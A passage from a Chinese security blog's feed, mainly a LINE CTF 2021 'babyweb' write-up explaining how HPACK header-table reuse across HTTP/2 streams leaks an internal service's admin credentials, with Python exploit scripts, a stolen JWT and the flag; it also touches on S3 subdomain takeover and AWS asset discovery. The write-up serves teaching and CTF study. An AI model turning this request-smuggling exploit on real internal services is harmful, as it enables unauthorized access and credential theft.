字段将我们的请求映射到对应的 Bucket，如果名称不同则无法映射到我们可控的 S3 Bucket 上，当然如果恰好映射到的那个 bucket 可控，那只能说我们运气爆棚 hhh</p><p>有一篇信息安全顶会的论文，拿 wordpress 为例，刨析了一下网络空间内子域名接管漏洞的情况，有兴趣的读者也可以去了解一下。</p><h2 id="0x08-一个彩蛋"><a href="#0x08-一个彩蛋" class="headerlink" title="0x08 一个彩蛋"></a>0x08 一个彩蛋</h2><p>我之前写过一个 S3OSINT，主要用于发现网络空间内可以未授权访问的对象存储服务，头两天看到一个老外也做了类似的事情（思路应该差不多，因为我发现他的数据量只比我多一点点），并且提供了有一定免费额度的商业化服务，有需要的小伙伴可以问我要。</p><p><img src="https://files.mdnice.com/user/12658/2334f711-6cc7-4fed-a89f-9455fdd69b1f.png" alt></p><h2 id="0x09-References"><a href="#0x09-References" class="headerlink" title="0x09 References"></a>0x09 References</h2><ol><li>A GUIDE TO SUBDOMAIN TAKEOVERS - <a href="https://www.hackerone.com/blog/Guide-Subdomain-Takeovers" target="_blank" rel="noopener">https://www.hackerone.com/blog/Guide-Subdomain-Takeovers</a></li><li>haccer/subjack - <a href="https://github.com/haccer/subjack" target="_blank" rel="noopener">https://github.com/haccer/subjack</a></li><li>EdOverflow/can-i-take-over-xyz - <a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank" rel="noopener">https://github.com/EdOverflow/can-i-take-over-xyz</a></li><li>HackerOne Hacker Activity subdomain takeover - <a href="https://hackerone.com/hacktivity?querystring=subdomain%20takeover" target="_blank" rel="noopener">https://hackerone.com/hacktivity?querystring=subdomain%20takeover</a></li><li>Amazon S3 - <a href="https://aws.amazon.com/cn/s3/" target="_blank" rel="noopener">https://aws.amazon.com/cn/s3/</a></li><li>Amazon S3 入门 - <a href="https://aws.amazon.com/cn/s3/getting-started/" target="_blank" rel="noopener">https://aws.amazon.com/cn/s3/getting-started/</a></li><li>Hosting a static website using Amazon S3 - <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html</a></li><li>Route53 Subdomain Takeover on test-cncf-aws.canary.k8s.io - <a href="https://hackerone.com/reports/794382" target="_blank" rel="noopener">https://hackerone.com/reports/794382</a></li><li><a href="https://mp.weixin.qq.com/s/eBPp4eyaGs827POFTesqOA" target="_blank" rel="noopener">基于甲方视角的漏洞发现</a></li><li>cloudfront takeover is not possible anymore - <a href="https://github.com/EdOverflow/can-i-take-over-xyz/issues/29" target="_blank" rel="noopener">https://github.com/EdOverflow/can-i-take-over-xyz/issues/29</a>) </li><li>Continually Enhancing Domain Security on Amazon CloudFront - <a href="https://aws.amazon.com/cn/blogs/networking-and-content-delivery/continually-enhancing-domain-security-on-amazon-cloudfront/" target="_blank" rel="noopener">https://aws.amazon.com/cn/blogs/networking-and-content-delivery/continually-enhancing-domain-security-on-amazon-cloudfront/</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;浅析 AWS S3 子域名接管漏洞&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;哈喽，大家好，我是童话。&lt;/p&gt;
&lt;p&gt;前段时间和
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTTP/2 Header Field Re-used Attack Trick</title>
    <link href="https://tonghuaroot.com/2021/03/29/HTTP-2-Header-Field-Re-used-Attack-Trick/"/>
    <id>https://tonghuaroot.com/2021/03/29/HTTP-2-Header-Field-Re-used-Attack-Trick/</id>
    <published>2021-03-29T11:57:24.000Z</published>
    <updated>2021-05-07T11:57:59.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>哈喽，大家好，我是童话。</p><p>最近一段时间一直没更新博客[1]，一方面是自己懒了，另一方面是由于工作性质的原因，很多工作中有趣的事情也不方便拿出来讲，又没有特别大块的时间去系统的搞一些独立项目、安全研究等，更新博客的事情便一拖再拖。</p><p>前阵子偶然看到 @Panda 师傅的公众号，更新频率以及质量都很高，至少我读过之后还是蛮有收获的，能在保持如此更新频率的情况下，还要兼顾质量，对于一个工作党来说，我个人认为这一点非常难得，并且是值得学习的。</p><p>说来惭愧，自己在 3 年前也注册过公众号，遗憾的是至今没有更新过一篇文章。</p><p><img src="https://files.mdnice.com/user/12658/0c333ba7-888f-4f74-9001-55f29519279e.png" alt></p><p>每次写博客的时候，我都在想要输出什么样的内容，最开始写东西的时候我都会事无巨细的写下来，包括操作流程、思考的过程。</p><p>有一段时间看到其他博主在写文章的时候只展示关键的操作步骤，并遗漏掉思考的过程，我发现很多安全学术界的论文也有这种现象。</p><p>这就导致了一个问题，从读者的角度来看，对于不熟悉的垂直领域，看到这样的文章，乍一看不明觉厉，实际操作起来没有办法复现，干着急，如果读者对这个领域比较熟悉的话，文章本身对他来说又没有特别多的价值，食之无味，弃之可惜。</p><p>我也曾经也模仿过这种写作风格，但我发现，这都不是我自己。前阵子在参加 Hacking Club 沙龙的时候，@Snowming 也和我说过，写文章的时候要考虑读者的感受，这样才能保证大家都有收获。</p><p>我想确实是这样的，至少几个月之后回头来看，我自己还是可以顺着整个文章完整的对某一个技术点进行复现。</p><p>在现实生活中，我并不是一个擅长表达的人，也很少去和朋友谈及我对某一件事情的看法和感受。思来想去，还是决定把这个公众号运营起来，对于这个公众号的定位，一来是分享一些不会太长但绝对有趣的安全技术知识点，另一方面也是向朋友们汇报一下我的近况，互通有无。</p><p>对于实时安全漏洞/事件跟进，我也许会发，也许不会发，虽然我很擅长这些，但是我确实不想在公众号运营上花费太多的时间。</p><h2 id="0x01-LINE-CTF-2021-babyweb"><a href="#0x01-LINE-CTF-2021-babyweb" class="headerlink" title="0x01 LINE CTF 2021 - babyweb"></a>0x01 LINE CTF 2021 - babyweb</h2><p>好了，啰嗦了这么多，进入今天的正题，来聊一聊  LINE CTF 2021 [2] 中 babyweb 这道题。</p><p>（比较有意思的是，在比赛开始之前，我的赛棍学弟 @T4rn 师傅跟我聊到的几个 Web 安全考点，几乎全部命中了。）</p><p>先来看一下题目：</p><p><img src="https://files.mdnice.com/user/12658/27df3867-cd47-4a91-9a0a-cf72a4a343e1.png" alt></p><p>Hint: babyweb/Neko is cute</p><p>源码：<a href="https://linectf.me/files/1db709b29e1b03b8f3a53102af0d5d6e/babyweb.tar.gz?token=eyJ1c2VyX2lkIjozMTEsInRlYW1faWQiOjIxOSwiZmlsZV9pZCI6OX0.YF8yeg.0rx3_9pOkTTFO53cmdyjRR5OuQc" target="_blank" rel="noopener">https://linectf.me/files/1db709b29e1b03b8f3a53102af0d5d6e/babyweb.tar.gz?token=eyJ1c2VyX2lkIjozMTEsInRlYW1faWQiOjIxOSwiZmlsZV9pZCI6OX0.YF8yeg.0rx3_9pOkTTFO53cmdyjRR5OuQc</a></p><p>题目地址：<a href="http://35.187.196.233/" target="_blank" rel="noopener">http://35.187.196.233/</a></p><p><img src="https://files.mdnice.com/user/12658/71fa3964-04c9-4d79-aa38-495ff4e3c443.png" alt></p><h2 id="0x02-Writeup"><a href="#0x02-Writeup" class="headerlink" title="0x02 Writeup"></a>0x02 Writeup</h2><p>黑盒大概浏览一下，功能比较简单，【Home】主页，【Note】添加和浏览笔记，直接暴露在外部的就没有其他的功能点了。</p><p>翻一下代码，这里比较银杏化的一点是，LINE CTF 的 Web 题目都是用 Docker 搭建的，我们可以把代码保存下来，未来可以用 Docker Compose 一键部署进行测试学习。</p><p>本地运行环境（我用的是 CentOS 7，需要提前安装好 Docker 和 Docker Compose）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line"></span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line"></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">sudo yum install docker-compose -y</span><br><span class="line"></span><br><span class="line">bash run.sh</span><br></pre></td></tr></table></figure><p>如果你的操作系统默认的 Python 为 python2，运行上述命令时，会报错误“SyntaxError: invalid syntax”，修改 run.sh 中的 python 为 python3 即可解决。</p><p><img src="https://files.mdnice.com/user/12658/1a46a588-e4ed-4943-9b6c-a094a8eb212c.png" alt></p><p>浏览了一下 run.sh、gen.py、docker-compose_tmp.yml 这 3 个文件，运行环境由 3 个 service 支撑，分别为 babyweb_public、babyweb_internal、babyweb_httpd。</p><p>由端口映射情况可知，babyweb_httpd 为我们刚刚访问，暴露在外部的服务。由环境变量的设置情况可知，Flag 埋在 babyweb_internal 服务中。</p><p>检查在 /home/centos/CTF 目录下所有文本文件中包含 12000、12001 的行号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rnw &apos;/home/centos/CTF&apos; -e &apos;12000&apos;</span><br><span class="line">grep -rnw &apos;/home/centos/CTF&apos; -e &apos;12001&apos;</span><br></pre></td></tr></table></figure><p><img src="https://files.mdnice.com/user/12658/dc3ee815-cdaf-4804-99b6-b71470915d07.png" alt></p><p>通过 httpd/httpd.conf 的文件内容（L552-L563）可知，babyweb_httpd 为一个反向代理，将请求转发到后端的 <a href="http://babyweb_public:12000/" target="_blank" rel="noopener">http://babyweb_public:12000/</a> 中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ErrorDocument 503 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 502 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 501 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 401 &quot;NOP&quot;</span><br><span class="line">    ErrorDocument 400 &quot;NOP&quot;</span><br><span class="line"></span><br><span class="line">    ProxyRequests Off</span><br><span class="line">    ProxyPreserveHost On</span><br><span class="line">    ProxyPass / http://babyweb_public:12000/</span><br><span class="line">    ProxyPassReverse / http://babyweb_public:12000/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>基于上述信息，猜测完整的交互情况为：外部用户访问 12001 端口（CTF 竞赛环境为 80，自建测试环境为 12001）的 babyweb_httpd 服务，babyweb_httpd 将请求转发至后端的 babyweb_public，babyweb_public 部分功能依赖 babyweb_internal，在某种情况下可以请求拿到 Flag。<br>继续分析一下 public、internal 两个目录下的源码，public 是基于 Flask 开发的 Web 应用，internal 是一个 Node 应用。逆序梳理出获取 Flag 的思路如下，<br>请求 /flag 路由，在请求头中携带正确的 x-token 信息获取 Flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://babyweb_internal:8443/flag -&gt; router() -&gt; getFlag() -&gt; req.headers[&apos;x-token&apos;] , checkToken() -&gt; verify() -&gt; decode() -&gt; CONFIG.flag</span><br></pre></td></tr></table></figure><p>请求 /auth 路由，在请求头中携带正确的用户名和密码信息，生成 JWT token：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://babyweb_internal:8443/auth -&gt; route() -&gt; auth() -&gt; -&gt; req.headers[CONFIG.header.username], req.headers[CONFIG.header.password], authCheck() -&gt; encode()</span><br></pre></td></tr></table></figure><p>babyweb_public 是一个 Flask 应用，其通过 Blueprint 的方式定义了 /internal/health 路由（POST 请求），会向 <a href="https://babyweb_internal:8443/auth" target="_blank" rel="noopener">https://babyweb_internal:8443/auth</a> 和 <a href="https://babyweb_internal:8443/health" target="_blank" rel="noopener">https://babyweb_internal:8443/health</a> 发起请求。<br>我们可以采用如下 HTTP 报文，通过响应内容验证请求已经可以抵达后端 Node 应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /internal/health HTTP/1.1</span><br><span class="line">Host: 35.187.196.233</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=eyJ1aWQiOiJkZTBmZWJiNS1hYTk5LTQyZjktYWZlZS0yZTE1NTRmNjIzNGIifQ.YGAK1Q.-aUr8s8SrSq0bx6iKZz7D0MsSas</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json;charset=utf8</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;: &quot;1.1&quot;, &quot;data&quot;: &quot;222&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://files.mdnice.com/user/12658/4c5b3589-179c-4403-a0c5-b8f2736eee32.png" alt></p><p>接下来就是这道题的核心考点，public/src/internal.py#L45-L61：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">elif data[&quot;type&quot;] == &quot;2&quot;:</span><br><span class="line">    conn = create_connection()</span><br><span class="line">    conn.request(&quot;GET&quot;, &quot;/health&quot;)</span><br><span class="line">    resp = conn.get_response()</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        cfg[&quot;HEADER&quot;][&quot;USERNAME&quot;]: cfg[&quot;ADMIN&quot;][&quot;USERNAME&quot;],</span><br><span class="line">        cfg[&quot;HEADER&quot;][&quot;PASSWORD&quot;]: cfg[&quot;ADMIN&quot;][&quot;PASSWORD&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    conn.request(&quot;GET&quot;, &quot;/auth&quot;, headers=headers)</span><br><span class="line">    resp = conn.get_response()</span><br><span class="line"></span><br><span class="line">    conn._new_stream()</span><br><span class="line">    </span><br><span class="line">    conn._send_cb(data[&quot;data&quot;].encode(&apos;latin-1&apos;))</span><br><span class="line">    conn._sock.fill()</span><br><span class="line">    return conn._sock.buffer.tobytes()</span><br></pre></td></tr></table></figure><p>再次梳理一下思路，突破这部分关键代码（public/src/internal.py#L57-L61），通过某种方式获取 JWT token，利用获取到的 JWT Token 请求获取 Flag。</p><p>Hyper 是一个基于 Python 实现的 HTTP/2 客户端 [7]，<figure class="highlight plain"><figcaption><span>方法通过连接的 stream socket 发送任意数据，相关的源码为 [8]，也就是说，我们可以利用``` _send_cb() ```方法，在新的 stream 中，创建一个新的 HTTP 请求，即 ```data["data"].encode('latin-1')``` 中的内容。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">说到这里，要简单科普一下 HTTP/2 中 stream 的概念。在 HTTP/2 中，一个 connection（连接） 被分为多个 stream，每一个 stream 携带单独的 request-response（请求-响应）对 [9]，Hyper 确保每一个响应匹配到正确的请求中。</span><br><span class="line">HPACK 是 HTTP/2 用于压缩编码 Header 信息的压缩算法规范，hpack 是一个 Python 第三方库，提供 Python 接口实现 HPACK 压缩算法，用于压缩 HTTP/2 中的 HTTP Header [11]。</span><br><span class="line"></span><br><span class="line">*We also found out that HTTP2 has Huffman Coding and some of useful information can be re-referenced and re-used in the upcoming stream.[6]*</span><br><span class="line"></span><br><span class="line">HTTP/2 采用 Huffman 编码，在 upcoming stream 中一些有价值的信息可以被 re-referenced/re-used。</span><br><span class="line"></span><br><span class="line">Hyper 压缩算法会将 HTTP Header 中的常用字符串用数字来代替 ，以此来减少 Header 中的字节数。这个 Huffman 编码是说，将一些高频次出现的数字采用更精简的字节来代替，比如对于数字 1 来说，我们可以采用 8 bit 的 1 个 byte 来表示，也可以直接采用 1 bit 来表示，以此来使 HTTP Header 的整体字节数更少。我们前面提到过，一个 HTTP/2 connection 包含多个 stream，每一个 stream 都会携带单独的 request-response（请求-响应）对，每一个 request 都存在一个 Header 信息，Header 中的字段可以视为 name-value 的有序集合，字段的顺序在经过 Hyper 压缩算法压缩前后顺序不变，所以此时，我们的思路就是通过遍历字段索引（index）方式即可获取到每一个 Header 字段。</span><br><span class="line"></span><br><span class="line">（由于是在同一个 HTTP/2 connection 中，不同的 stream 的 Header 字段，由同一个有序集合进行维护。 这里涉及到 Indexing Tables 的概念，一个 connection 维护一个 Indexing Tables，Static Table 为协议规定的 61 个 Index 是固定不变的，这道题目自定一的两个 Header 字段（x-user-&#123;uuid4()&#125;、x-pass-&#123;uuid4()&#125;）为 Dynamic Table 表中的内容。关于这部分详细且权威的介绍，可以参考 RFC 文档。[12]）</span><br><span class="line"></span><br><span class="line">结合题目的代码来看，在 ```conn._new_stream()``` 这个新的 stream（upcoming stream） 创建之前，向 /auth 发起过请求，且之前的请求 Header 中是包含了正确的用户名和密码字段的，如果我们可以通过遍历 Header 字段索引（index）的办法 re-used（重用）这两个 Header 字段（x-user-&#123;uuid4()&#125;、x-pass-&#123;uuid4()&#125;），再次向 /auth 发起请求的话，就可以顺利拿到 JWT Token 了。</span><br><span class="line">构造获取 JWK Token 的利用代码如下：</span><br></pre></td></tr></table></figure></p><p>import requests<br>import hpack<br>from hyperframe.frame import *</p><p>def header(id, idx):<br>    enc = hpack.Encoder()</p><pre><code>h1 = enc._encode_indexed(idx)h2 = enc._encode_indexed(idx + 1)ha = enc.encode({    &apos;:path&apos;: &apos;/auth&apos;,    &apos;:method&apos;: &apos;GET&apos; })hb = enc.encode({    &apos;:authority&apos;: &apos;babyweb_internal&apos;,    &apos;:scheme&apos;: &apos;https&apos;})h = ha + hb + h1 + h2p = HeadersFrame(id, h)p.flags.add(&apos;END_HEADERS&apos;)p = p.serialize()return p</code></pre><p>sess = requests.Session()<br>HOST = ‘35.187.196.233’</p><p>for i in range(62, 128):<br>    r = sess.post(‘http://‘ + HOST + ‘/internal/health’, json={<br>        ‘data’: b’’.join([header(5, i)]).decode(‘latin-1’),<br>        ‘type’: ‘2’<br>    })</p><pre><code>content = r.contentprint(&quot;&quot;)print(i)print(content)while content:    frame, length = Frame.parse_frame_header(content[:9])    print(frame, length)    content = content[9 + length:]</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以获取到 token 信息如下：</span><br></pre></td></tr></table></figure><p>65<br>b’\x00\x00\x02\x01\x04\x00\x00\x00\x05\x88\xbe\x00\x00\xab\x00\x01\x00\x00\x00\x05{“result”:true,”token”:”eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTY5NDM3NDd9.05Vevw3TUfheBwhdztDZbpgavsjVDm6tQIW99gODYR0”}’<br>HeadersFrame(Stream: 5; Flags: END_HEADERS):  2<br>DataFrame(Stream: 5; Flags: END_STREAM):  171<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">剩下的内容就简单了，我们拿着获取到的 token 构造一个新的 HTTP/2 请求，相关漏洞利用代码如下：</span><br></pre></td></tr></table></figure></p><p>import requests<br>import hpack<br>from hyperframe.frame import *</p><p>def header(id):<br>    enc = hpack.Encoder()<br>    h = enc.encode({<br>        ‘:path’: ‘/flag’,<br>        ‘:method’: ‘GET’,<br>        ‘:authority’: ‘babyweb_internal’,<br>        ‘:scheme’: ‘https’,<br>        ‘x-token’: ‘eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTY5NDM3NDd9.05Vevw3TUfheBwhdztDZbpgavsjVDm6tQIW99gODYR0’<br>    })<br>    p = HeadersFrame(id, h)<br>    p.flags.add(‘END_HEADERS’)<br>    p = p.serialize()<br>    return p</p><p>sess = requests.Session()<br>HOST = ‘35.187.196.233’<br>r = sess.post(‘http://‘ + HOST + ‘/internal/health’, json={<br>    ‘data’: b’’.join([header(5)]).decode(‘latin-1’),<br>    ‘type’: ‘2’<br>})<br>content = r.content<br>print(content)<br>while content:<br>    frame, length = Frame.parse_frame_header(content[:9])<br>    print(frame, length)<br>    content = content[9 + length:]<br><code>`</code></p><p>最终获取到 Flag 为：LINECTF{this_ch4ll_1s_really_baby_web}</p><p><img src="https://files.mdnice.com/user/12658/52b870de-6919-48bb-95ce-3a0e60b1e5eb.png" alt></p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>这道题目还是蛮有意思的，总结一下，核心的考点是利用 HPACK 在同一个 connection 的不同的 stream 中使用相同的 Indexing Tables 这一特性导致的 Header 字段重用。</p><p>另外，目前，CTF 的线上环境仍然是有效的，有兴趣的读者可以直接访问做一些测试。我这边也将赛题环境和漏洞利用代码备份到了 Github 上留存，地址为：<a href="https://github.com/tonghuaroot/My-CTF-Web-Challenges/tree/main/LINE%20CTF%202021/babyweb" target="_blank" rel="noopener">https://github.com/tonghuaroot/My-CTF-Web-Challenges/tree/main/LINE%20CTF%202021/babyweb</a> </p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p>[1] TonghuaRoot’s BloG. - Cyber security enthusiast, not Hacker. - <a href="https://tonghuaroot.com/">https://tonghuaroot.com/</a></p><p>[2] LINE CTF 2021 <a href="https://linectf.me/" target="_blank" rel="noopener">https://linectf.me/</a></p><p>[3] What is the difference between docker-compose ports vs expose <a href="https://stackoverflow.com/questions/40801772/what-is-the-difference-between-docker-compose-ports-vs-expose" target="_blank" rel="noopener">https://stackoverflow.com/questions/40801772/what-is-the-difference-between-docker-compose-ports-vs-expose</a></p><p>[4] How do I find all files containing specific text on Linux? <a href="https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux" target="_blank" rel="noopener">https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux</a></p><p>[5] Install Docker Engine on CentOS <a href="https://docs.docker.com/engine/install/centos/" target="_blank" rel="noopener">https://docs.docker.com/engine/install/centos/</a></p><p>[6] LINE CTF 2021 Writeup - babyweb <a href="https://hackmd.io/@stypr233/linectf#babyweb" target="_blank" rel="noopener">https://hackmd.io/@stypr233/linectf#babyweb</a></p><p>[7] Hyper: HTTP/2 Client for Python <a href="https://hyper.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">https://hyper.readthedocs.io/en/latest/index.html</a></p><p>[8] _send_cb() <a href="https://github.com/python-hyper/hyper/blob/development/hyper/http20/connection.py#L625-L642" target="_blank" rel="noopener">https://github.com/python-hyper/hyper/blob/development/hyper/http20/connection.py#L625-L642</a></p><p>[9] Streams <a href="https://hyper.readthedocs.io/en/latest/quickstart.html#streams" target="_blank" rel="noopener">https://hyper.readthedocs.io/en/latest/quickstart.html#streams</a></p><p>[10] HPACK和twitter hpack源码解析 <a href="https://www.jianshu.com/p/96f21b9b4fd5" target="_blank" rel="noopener">https://www.jianshu.com/p/96f21b9b4fd5</a></p><p>[11] hpack: HTTP/2 Header Compression for Python <a href="https://python-hyper.org/projects/hpack/en/stable/" target="_blank" rel="noopener">https://python-hyper.org/projects/hpack/en/stable/</a></p><p>[12] Indexing Tables <a href="https://tools.ietf.org/html/rfc7541#section-2.3" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7541#section-2.3</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;哈喽，大家好，我是童话。&lt;/p&gt;
&lt;p&gt;最近一段时间一直没更新博客[1]，一方面是自己懒了，另一方面
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>This is a test page for testing Github Action</title>
    <link href="https://tonghuaroot.com/2020/11/25/This-is-a-test-page-for-testing-Github-Action/"/>
    <id>https://tonghuaroot.com/2020/11/25/This-is-a-test-page-for-testing-Github-Action/</id>
    <published>2020-11-25T15:35:11.000Z</published>
    <updated>2020-11-26T12:46:38.614Z</updated>
    
    <content type="html"><![CDATA[<p>11<br>22<br>333<br>444</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;11&lt;br&gt;22&lt;br&gt;333&lt;br&gt;444&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Smogcloud - AWS external network asset discovery platform</title>
    <link href="https://tonghuaroot.com/2020/11/16/Smogcloud-AWS-external-network-asset-discovery-platform/"/>
    <id>https://tonghuaroot.com/2020/11/16/Smogcloud-AWS-external-network-asset-discovery-platform/</id>
    <published>2020-11-16T12:31:54.000Z</published>
    <updated>2020-11-16T12:46:19.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对于一家大量采用AWS的甲方企业来说，如何实时的发现暴露在外网的AWS资产对其进行企业安全建设来说则至关重要。这些暴露在外面的AWS资产就是潜在的攻击面，我们可以这些资产进行更高优先级的监控，确保当出现安全问题时可以第一时间进行事件响应。而来我们也可以对这些暴露再外的资产进行高优先级的风险评估，尽量避免其出现已知的安全问题。当然，随着业务的发展，暴露在外的资产信息也是动态变化的，如何实时的收集到这些变化的动态资产信息，进行高优先级的风险评估是一个值得思考的问题。<br>我们没有办法保护我们看不到的资产，在这篇文章中，我主要记录一下我对Smogcloud这款开源项目的一些研究，以及如何配合Smogcloud和其他工具耦合起来实现高效且稳定的AWS公网资产监控平台。</p><h2 id="0x01-Smogcloud-简介"><a href="#0x01-Smogcloud-简介" class="headerlink" title="0x01 Smogcloud 简介"></a>0x01 Smogcloud 简介</h2><p>如 Smogcloud 的 README 页面所述，其主要解决的问题就是发现暴露在外网的AWS资产，全量、实时、稳定的AWS资产监控平台是我们实施下一步安全手段的第一步。<br>Smogcloud 主要解决的问题如下：</p><ol><li>针对多个AWS账号进行外网资产发现</li><li>针对这些资产进行检查是否存在错误配置或者相关安全问题</li><li>识别长时间未使用的资产</li><li>识别未被监控到的资产</li><li>Shadow IT</li></ol><h2 id="0x02-当前环境"><a href="#0x02-当前环境" class="headerlink" title="0x02 当前环境"></a>0x02 当前环境</h2><ul><li>Amazon Linux 2</li><li>Golang 1.15.5</li></ul><h2 id="0x03-Smogcloud-的安装和配置"><a href="#0x03-Smogcloud-的安装和配置" class="headerlink" title="0x03 Smogcloud 的安装和配置"></a>0x03 Smogcloud 的安装和配置</h2><p>由于 Smogcloud  是基于 Golang 开发的，在使用 Smogcloud 之前我们要先安装Golang的开发环境。看了下代码写的还是比较简洁的，直接拿来用用，后面需要的话直接上手改代码简单扩展一些也是ok的。<br>一、Golang 的安装和配置步骤如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.15.5.linux-amd64.tar.gz</span><br><span class="line">vim 